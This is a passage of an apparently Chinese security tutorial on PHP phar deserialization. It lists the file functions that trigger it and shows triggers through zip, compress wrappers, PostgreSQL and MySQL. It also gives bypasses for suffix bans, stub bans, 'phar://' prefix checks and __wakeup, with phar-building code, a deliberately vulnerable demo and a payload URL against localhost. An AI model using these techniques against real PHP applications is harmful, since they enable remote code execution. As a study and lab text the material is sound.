+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;glob&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;data&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;http&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">&#34;ftp&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;phar&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">11</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">&#34;zip&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注册wapper可以实现功能，具体看底层代码：
+<a href="https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/php_streams.h#L132" target="_blank" rel="noopener noreferrer">https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/php_streams.h#L132</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_php_stream_wrapper_ops</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* open/create a wrapped stream */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">php_stream</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">stream_opener</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">options</span><span class="p">,</span> <span class="n">zend_string</span> <span class="o">**</span><span class="n">opened_path</span><span class="p">,</span> <span class="n">php_stream_context</span> <span class="o">*</span><span class="n">context</span> <span class="n">STREAMS_DC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* close/destroy a wrapped stream */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">stream_closer</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="n">php_stream</span> <span class="o">*</span><span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* stat a wrapped stream */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">stream_stat</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="n">php_stream</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="n">php_stream_statbuf</span> <span class="o">*</span><span class="n">ssb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* stat a URL */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">url_stat</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">url</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="n">php_stream_statbuf</span> <span class="o">*</span><span class="n">ssb</span><span class="p">,</span> <span class="n">php_stream_context</span> <span class="o">*</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* open a &#34;directory&#34; stream */</span>
+</span></span><span class="line"><span class="cl">    <span class="n">php_stream</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">dir_opener</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">options</span><span class="p">,</span> <span class="n">zend_string</span> <span class="o">**</span><span class="n">opened_path</span><span class="p">,</span> <span class="n">php_stream_context</span> <span class="o">*</span><span class="n">context</span> <span class="n">STREAMS_DC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">label</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* delete a file */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">unlink</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">url</span><span class="p">,</span> <span class="kt">int</span> <span class="n">options</span><span class="p">,</span> <span class="n">php_stream_context</span> <span class="o">*</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* rename a file */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">rename</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">url_from</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">url_to</span><span class="p">,</span> <span class="kt">int</span> <span class="n">options</span><span class="p">,</span> <span class="n">php_stream_context</span> <span class="o">*</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Create/Remove directory */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">stream_mkdir</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">url</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span> <span class="kt">int</span> <span class="n">options</span><span class="p">,</span> <span class="n">php_stream_context</span> <span class="o">*</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">stream_rmdir</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">url</span><span class="p">,</span> <span class="kt">int</span> <span class="n">options</span><span class="p">,</span> <span class="n">php_stream_context</span> <span class="o">*</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Metadata handling */</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">stream_metadata</span><span class="p">)(</span><span class="n">php_stream_wrapper</span> <span class="o">*</span><span class="n">wrapper</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">url</span><span class="p">,</span> <span class="kt">int</span> <span class="n">options</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="n">php_stream_context</span> <span class="o">*</span><span class="n">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">php_stream_wrapper_ops</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看见拥有：
+stream_opener,stream_closer,stream_stat,url_stat,dir_opener,unlink,rename,stream_mkdir,stream_metadata
+这几个功能
+404实验室seaii指出了所有文件函数均可使用</p>
+<ul>
+<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
+<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
+<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / `fopen``</li>
+<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
+<li><code>parse_ini_file</code></li>
+<li><code>unlink</code></li>
+<li><code>copy</code>
+根据文章的分析，可以看见，其原理都是调用了 <code>php_stream_locate_url_wrapper</code>这个函数，都是直接或者间接的触发反序列化的wrapper。
+接下来是一些touch文件</li>
+</ul>
+<h4 id="exif" class="headerLink">
+    <a href="#exif" class="header-mark"></a>exif</h4><ul>
+<li><code>exif_thumbnail</code></li>
+<li><code>exif_imagetype</code></li>
+</ul>
+<h4 id="gd" class="headerLink">
+    <a href="#gd" class="header-mark"></a>gd</h4><ul>
+<li><code>imageloadfont</code></li>
+<li><code>imagecreatefrom***</code></li>
+</ul>
+<h4 id="hash" class="headerLink">
+    <a href="#hash" class="header-mark"></a>hash</h4><ul>
+<li><code>hash_hmac_file</code></li>
+<li><code>hash_file</code></li>
+<li><code>hash_update_file</code></li>
+<li><code>md5_file</code></li>
+<li><code>sha1_file</code></li>
+</ul>
+<h4 id="file--url" class="headerLink">
+    <a href="#file--url" class="header-mark"></a>file / url</h4><ul>
+<li><code>get_meta_tags</code></li>
+<li><code>get_headers</code></li>
+</ul>
+<h4 id="standard" class="headerLink">
+    <a href="#standard" class="header-mark"></a>standard</h4><ul>
+<li><code>getimagesize</code></li>
+<li><code>getimagesizefromstring</code></li>
+</ul>
+<h4 id="zip" class="headerLink">
+    <a href="#zip" class="header-mark"></a>zip</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$res</span> <span class="o">=</span> <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="s1">&#39;c.zip&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="s1">&#39;phar://test.phar/test&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="bzip--gzip可用于bypass-phar的情况" class="headerLink">
+    <a href="#bzip--gzip%e5%8f%af%e7%94%a8%e4%ba%8ebypass-phar%e7%9a%84%e6%83%85%e5%86%b5" class="header-mark"></a>Bzip / Gzip(可用于bypass phar://的情况)</h4><p>demo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$z</span> <span class="o">=</span> <span class="s1">&#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然，它同样适用于<code>compress.zlib://</code>。</p>
+<h4 id="postgres" class="headerLink">
+    <a href="#postgres" class="header-mark"></a>postgres</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;pgsql:host=%s;dbname=%s;user=%s;password=%s&#34;</span><span class="p">,</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;postgres&#34;</span><span class="p">,</span> <span class="s2">&#34;sx&#34;</span><span class="p">,</span> <span class="s2">&#34;123456&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">pgsqlCopyFromFile</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">,</span> <span class="s1">&#39;phar://test.phar/aa&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="mysql" class="headerLink">
+    <a href="#mysql" class="header-mark"></a>Mysql</h4><p>Mysql的load data local infile也会触发php_stream_open_wrapper</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$m</span> <span class="o">=</span> <span class="nx">mysqli_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_options</span><span class="p">(</span><span class="nv">$m</span><span class="p">,</span> <span class="nx">MYSQLI_OPT_LOCAL_INFILE</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$s</span> <span class="o">=</span> <span class="nx">mysqli_real_connect</span><span class="p">(</span><span class="nv">$m</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">,</span> <span class="s1">&#39;easyweb&#39;</span><span class="p">,</span> <span class="mi">3306</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$p</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$m</span><span class="p">,</span> <span class="s1">&#39;LOAD DATA LOCAL INFILE \&#39;phar://test.phar/test\&#39; INTO TABLE a  LINES TERMINATED BY \&#39;\r\n\&#39;  IGNORE 1 LINES;&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x04一些bypass" class="headerLink">
+    <a href="#0x04%e4%b8%80%e4%ba%9bbypass" class="header-mark"></a>0x04一些bypass</h2><h3 id="常规bypass" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%84bypass" class="header-mark"></a>常规bypass</h3><h4 id="后缀名phar-ban" class="headerLink">
+    <a href="#%e5%90%8e%e7%bc%80%e5%90%8dphar-ban" class="header-mark"></a>后缀名phar ban</h4><p>当phar这个后缀名被ban的时候，可以直接对后缀进行更改，不会影响到协议的读取，因为根据前面stub来判断phar，例如前面构造的jpg来绕过一些限制。拿上面的举个例子。
+<figure><img
+        
+        loading="lazy"
+        src="/img/phar/4.png"
+        srcset="/img/phar/4.png, /img/phar/4.png 1.5x, /img/phar/4.png 2x"
+        alt="/img/phar/4.png"
+        title="/img/phar/4.png" ></figure></p>
+<h4 id="stub-ban" class="headerLink">
+    <a href="#stub-ban" class="header-mark"></a>stub ban</h4><p>如果ban了stub头，那么可以将phar文件进行一次压缩，建议使用linux的自带压缩gzip，使用windows的bandzip等会导致算法问题无法触发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">gzip</span> <span class="mf">1.</span><span class="n">zip</span> <span class="mf">1.</span><span class="n">phar</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果无法用phar协议，那么就可以用下面的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">compress</span><span class="o">.</span><span class="nx">zlib</span><span class="o">://</span><span class="nx">phar</span><span class="o">://</span><span class="nx">phar</span><span class="o">.</span><span class="nx">phar</span><span class="o">/</span><span class="nx">test</span><span class="o">.</span><span class="nx">txt</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我写一个例子出来：
+demo: a.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DTtest</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;GIF89a&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DTtest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>phar.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>   
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>   
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$a </span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>   <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;phar://&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$a</span><span class="p">)){</span>       <span class="k">die</span><span class="p">(</span><span class="nx">nonono</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>   
+</span></span><span class="line"><span class="cl">	<span class="k">include</span> <span class="nv">$a</span><span class="p">;</span>   
+</span></span><span class="line"><span class="cl"><span class="p">}</span>   
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DTtest</span><span class="p">{</span>          
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">;</span>          
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">phpinfo</span><span class="p">();</span>            
+</span></span><span class="line"><span class="cl"><span class="p">}</span>      
+</span></span><span class="line"><span class="cl"><span class="p">}</span>      
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里为了简便就不写对后缀名的限制了，但是我这里还是上传gif文件。
+<figure><img
+        
+        loading="lazy"
+        src="/img/phar/6.png"
+        srcset="/img/phar/6.png, /img/phar/6.png 1.5x, /img/phar/6.png 2x"
+        alt="/img/phar/6.png"
+        title="/img/phar/6.png" ></figure>
+playlaod:http://127.0.0.1/phar.php?filename=compress.zlib://phar://phar.gif
+同样的zip协议我就不写了</p>
+<h3 id="绕过__wakeup" class="headerLink">
+    <a href="#%e7%bb%95%e8%bf%87__wakeup" class="header-mark"></a>绕过__\wakeup</h3><p><strong>php版本 PHP5&lt;5.6.25，PHP7 &lt; 7.0.10</strong>
+在正常的反序列化漏洞中，都知道，可以通过改变成员数来绕过wakeup（）（具体为什么我后面再去分析），所以在phar反序列化中一样，这里直接给出demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DTtest</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;GIF89a&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DTtest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;O:6:&#34;</span><span class="nx">DTtest</span><span class="o">:</span><span class="mi">1</span><span class="s2">&#34;,&#34;</span><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;DTtest&#34;</span><span class="o">:</span><span class="mi">2</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面自动计算签名即可
+另外一个方式（当php版本对应不上且含有__destruct方法的时候）可以使用GC回收机制来直接触发销毁方法从而绕过wakeup
+或者可以利用aecous师傅写的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
